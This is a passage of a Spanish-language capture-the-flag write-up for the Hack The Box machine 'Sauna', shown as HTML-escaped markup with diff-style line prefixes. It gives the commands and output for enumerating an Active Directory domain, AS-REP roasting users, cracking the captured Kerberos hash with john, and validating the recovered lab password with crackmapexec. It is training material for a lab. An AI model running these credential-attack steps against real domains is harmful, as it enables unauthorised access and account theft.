-dn: &lt;span class=&quot;nv&quot;&gt;OU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Domain Controllers,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;System,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LostAndFound,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Infrastructure,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForeignSecurityPrincipals,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Program Data,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Quotas,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Keys,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TPM Devices,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Builtin,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-dn: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Hugo Smith,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;EGOTISTICAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-&lt;span class=&quot;c&quot;&gt;# refldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTISTI&lt;/span&gt;
- CAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-&lt;span class=&quot;c&quot;&gt;# refldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTISTI&lt;/span&gt;
- CAL-BANK,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOCAL
-
-&lt;span class=&quot;c&quot;&gt;# refldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCA&lt;/span&gt;
- L
- 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el OU que es &lt;strong&gt;OU=Domain Controllers&lt;/strong&gt; y un posible usuario de dominio &lt;strong&gt;Hugo Smith&lt;/strong&gt;. Ahora vamos a ver si podemos enumerar usuarios del dominio con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; enumdomusers
-result was NT_STATUS_ACCESS_DENIED
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que no tenemos los permisos. Tenemos el puerto 88 abierto, así que igual podríamos tratar de tomar los posibles usuarios sobre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;about.html&lt;/code&gt; y ver cuales podrían ser válidos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://10.10.10.175/about.html | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mt-2&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Fergus&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 5 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print substr($1,1,1)$2}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;users.txt
-───────┬─────────────────────────────────────
-       │ File: users.txt
-───────┼─────────────────────────────────────
-   1   │ FSmith
-   2   │ HBear
-   3   │ SKerb
-   4   │ SCoins
-   5   │ BTaylor
-   6   │ SDriver
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos los usuarios en un formato la primera letra del nombre y posterior el apellido (considerando un tipo entorno empresarial). Mediante el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers&lt;/code&gt; vamos a tratar de obtener un hash de algun usuario:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-GetNPUsers &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; users.txt EGOTISTICAL-BANK.LOCAL/ &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; john &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; hashes.txt &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.175
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos database&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos manda &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionError&lt;/code&gt;, pero si checamos nuestro directorio de trabajo, tenemos el archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashes.txt&lt;/code&gt; el cual tiene el hash del usuario &lt;strong&gt;FSmith&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ll
-.rw-r--r-- root root 587 B Sun Jan 30 22:06:22 2022  hashes.txt
-.rw-r--r-- root root  42 B Sun Jan 30 22:01:20 2022  users.txt
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;hashes.txt
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: hashes.txt
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ &lt;span class=&quot;nv&quot;&gt;$krb5asrep$FSmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:dd748d6e619c16a65860c534d1466033&lt;span class=&quot;nv&quot;&gt;$c7b74702da69fea9e87b760546ad3717988714219c086c&lt;/span&gt;
-       │ b2a4e13f6b7013eb6fd65c71c625fbd8b10da7d902b7670aae88634d2a24b463298fc782c9fec98794ab3b68bf7a70dd335fce53f58d309bc6f5df3d
-       │ 9cd175c388731d99f10ff451198722e8d487ec9c2a64eaeaacf76a6b2680a46f4b1ccdb26f69f0133e3de6d7c4579cadda1261d9ff8635356a6556fd
-       │ ed3a61c79fb0b0479a1abf890b2271affda6158380d12b863e3b5eb523ceaf2bdde032d9729922215570cde6ed194a3fb2f07ec707aed28be14a8d32
-       │ 0dfba7cacd75ac88d6cd2754c07d88ffb2cef346cb28b74786bcf9500f4a29c1ba71bc084785847a273f1620c4b03bbfba450ac299
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como tenemos un hash en formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, podemos crackearlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashes.txt
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5asrep, Kerberos 5 AS-REP etype 17/18/23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Will run 8 OpenMP threads
-Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-Thestrokes23     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$krb5asrep$FSmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:05 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-01-30 22:08&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.1769g/s 1865Kp/s 1865Kc/s 1865KC/s Tiffani1432..Thehunter22
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos ya unas credenciales de un usuario de dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSmith : Thestrokes23&lt;/code&gt;; vamos a validarlas.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'FSmith'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Thestrokes23'&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith:Thestrokes23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Contamos con credenciales válidas y mediante la utilidad &lt;a href=&quot;https://github.com/dirkjanm/ldapdomaindump&quot;&gt;ldapdomaindump&lt;/a&gt; vamos a tratar de obtener información sobre el dominio.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/dirkjanm/ldapdomaindump
-Clonando en &lt;span class=&quot;s1&quot;&gt;'ldapdomaindump'&lt;/span&gt;...
-remote: Enumerating objects: 255, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;58/58&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7/7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 255 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 51 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 197
-Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;255/255&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 115.59 KiB | 978.00 KiB/s, listo.
-Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;137/137&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
-❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ldapdomaindump/
-❯ python setup.py &lt;span class=&quot;nb&quot;&gt;install                                                                                                        
-&lt;/span&gt;running &lt;span class=&quot;nb&quot;&gt;install                                                 
-&lt;/span&gt;running bdist_egg                                               
-running egg_info                                                                                                                 
-creating ldapdomaindump.egg-info                                                                                                 
-writing requirements to ldapdomaindump.egg-info/requires.txt                                                                     
-writing ldapdomaindump.egg-info/PKG-INFO                                                                                         
-writing top-level names to ldapdomaindump.egg-info/top_level.txt                                          
-writing dependency_links to ldapdomaindump.egg-info/dependency_links.txt              
-writing manifest file &lt;span class=&quot;s1&quot;&gt;'ldapdomaindump.egg-info/SOURCES.txt'&lt;/span&gt;                                                                      
-reading manifest file &lt;span class=&quot;s1&quot;&gt;'ldapdomaindump.egg-info/SOURCES.txt'&lt;/span&gt;                                                                      
-reading manifest template &lt;span class=&quot;s1&quot;&gt;'MANIFEST.in'&lt;/span&gt;                                                                                          
-writing manifest file &lt;span class=&quot;s1&quot;&gt;'ldapdomaindump.egg-info/SOURCES.txt'&lt;/span&gt;
-installing library code to build/bdist.linux-x86_64/egg                                                                          
-running install_lib    
-running build_py                                                                                                                 
-creating build                
-creating build/lib.linux-x86_64-2.7                          
-creating build/lib.linux-x86_64-2.7/ldapdomaindump           
-copying ldapdomaindump/__init__.py -&amp;gt; build/lib.linux-x86_64-2.7/ldapdomaindump                                                  
-copying ldapdomaindump/__main__.py -&amp;gt; build/lib.linux-x86_64-2.7/ldapdomaindump
-copying ldapdomaindump/convert.py -&amp;gt; build/lib.linux-x86_64-2.7/ldapdomaindump
-copying ldapdomaindump/pretty.py -&amp;gt; build/lib.linux-x86_64-2.7/ldapdomaindump
-copying ldapdomaindump/style.css -&amp;gt; build/lib.linux-x86_64-2.7/ldapdomaindump
-creating build/bdist.linux-x86_64                                                                                                
-creating build/bdist.linux-x86_64/egg                                                                                            
-creating build/bdist.linux-x86_64/egg/ldapdomaindump                                                                             
-copying build/lib.linux-x86_64-2.7/ldapdomaindump/__init__.py -&amp;gt; build/bdist.linux-x86_64/egg/ldapdomaindump
-copying build/lib.linux-x86_64-2.7/ldapdomaindump/__main__.py -&amp;gt; build/bdist.linux-x86_64/egg/ldapdomaindump
-copying build/lib.linux-x86_64-2.7/ldapdomaindump/convert.py -&amp;gt; build/bdist.linux-x86_64/egg/ldapdomaindump
-copying build/lib.linux-x86_64-2.7/ldapdomaindump/pretty.py -&amp;gt; build/bdist.linux-x86_64/egg/ldapdomaindump
-copying build/lib.linux-x86_64-2.7/ldapdomaindump/style.css -&amp;gt; build/bdist.linux-x86_64/egg/ldapdomaindump
-byte-compiling build/bdist.linux-x86_64/egg/ldapdomaindump/__init__.py to __init__.pyc
-byte-compiling build/bdist.linux-x86_64/egg/ldapdomaindump/__main__.py to __main__.pyc
-byte-compiling build/bdist.linux-x86_64/egg/ldapdomaindump/convert.py to convert.pyc
-byte-compiling build/bdist.linux-x86_64/egg/ldapdomaindump/pretty.py to pretty.pyc
-creating build/bdist.linux-x86_64/egg/EGG-INFO
-installing scripts to build/bdist.linux-x86_64/egg/EGG-INFO/scripts
-running install_scripts
-running build_scripts
-creating build/scripts-2.7
-copying and adjusting bin/ldapdomaindump -&amp;gt; build/scripts-2.7
-copying and adjusting bin/ldd2bloodhound -&amp;gt; build/scripts-2.7
-copying and adjusting bin/ldd2pretty -&amp;gt; build/scripts-2.7
-changing mode of build/scripts-2.7/ldapdomaindump from 644 to 755
-changing mode of build/scripts-2.7/ldd2bloodhound from 644 to 755
-changing mode of build/scripts-2.7/ldd2pretty from 644 to 755
-creating build/bdist.linux-x86_64/egg/EGG-INFO/scripts
-copying build/scripts-2.7/ldapdomaindump -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO/scripts
-copying build/scripts-2.7/ldd2bloodhound -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO/scripts
-copying build/scripts-2.7/ldd2pretty -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO/scripts
-changing mode of build/bdist.linux-x86_64/egg/EGG-INFO/scripts/ldapdomaindump to 755
-changing mode of build/bdist.linux-x86_64/egg/EGG-INFO/scripts/ldd2bloodhound to 755
-changing mode of build/bdist.linux-x86_64/egg/EGG-INFO/scripts/ldd2pretty to 755
-copying ldapdomaindump.egg-info/PKG-INFO -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO
-copying ldapdomaindump.egg-info/SOURCES.txt -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO
-copying ldapdomaindump.egg-info/dependency_links.txt -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO
-copying ldapdomaindump.egg-info/requires.txt -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO
-copying ldapdomaindump.egg-info/top_level.txt -&amp;gt; build/bdist.linux-x86_64/egg/EGG-INFO
-zip_safe flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; analyzing archive contents...
-ldapdomaindump.__init__: module references __file__
-creating dist
-creating &lt;span class=&quot;s1&quot;&gt;'dist/ldapdomaindump-0.9.3-py2.7.egg'&lt;/span&gt; and adding &lt;span class=&quot;s1&quot;&gt;'build/bdist.linux-x86_64/egg'&lt;/span&gt; to it
-removing &lt;span class=&quot;s1&quot;&gt;'build/bdist.linux-x86_64/egg'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and everything under it&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Processing ldapdomaindump-0.9.3-py2.7.egg
-removing &lt;span class=&quot;s1&quot;&gt;'/usr/local/lib/python2.7/dist-packages/ldapdomaindump-0.9.3-py2.7.egg'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and everything under it&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-creating /usr/local/lib/python2.7/dist-packages/ldapdomaindump-0.9.3-py2.7.egg
-Extracting ldapdomaindump-0.9.3-py2.7.egg to /usr/local/lib/python2.7/dist-packages
-ldapdomaindump 0.9.3 is already the active version &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;easy-install.pth
-Installing ldapdomaindump script to /usr/local/bin
-Installing ldd2bloodhound script to /usr/local/bin
-Installing ldd2pretty script to /usr/local/bin
-
-Installed /usr/local/lib/python2.7/dist-packages/ldapdomaindump-0.9.3-py2.7.egg
-Processing dependencies &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ldapdomaindump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;0.9.3
-Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;future&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;0.18.2
-Best match: future 0.18.2
-Processing future-0.18.2-py2.7.egg
-future 0.18.2 is already the active version &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;easy-install.pth
-Installing pasteurize script to /usr/local/bin
-Installing futurize script to /usr/local/bin
-Using /usr/local/lib/python2.7/dist-packages/future-0.18.2-py2.7.egg
-Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ldap3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;2.9.1
-Best match: ldap3 2.9.1
-Processing ldap3-2.9.1-py2.7.egg
-ldap3 2.9.1 is already the active version &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;easy-install.pth
-
-Using /usr/local/lib/python2.7/dist-packages/ldap3-2.9.1-py2.7.egg
-Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;dnspython&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;2.1.0
-Best match: dnspython 2.1.0
-Processing dnspython-2.1.0-py2.7.egg
-dnspython 2.1.0 is already the active version &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;easy-install.pth
-
-Using /usr/local/lib/python2.7/dist-packages/dnspython-2.1.0-py2.7.egg
-Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pyasn1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;0.4.8
-Best match: pyasn1 0.4.8
-Adding pyasn1 0.4.8 to easy-install.pth file
-
-Using /usr/local/lib/python2.7/dist-packages
-Finished processing dependencies &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ldapdomaindump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;0.9.3
-❯ python3 ldapdomaindump.py
-usage: ldapdomaindump.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; USERNAME] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; PASSWORD] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-at&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;NTLM,SIMPLE&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; DIRECTORY] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--no-html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--no-json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
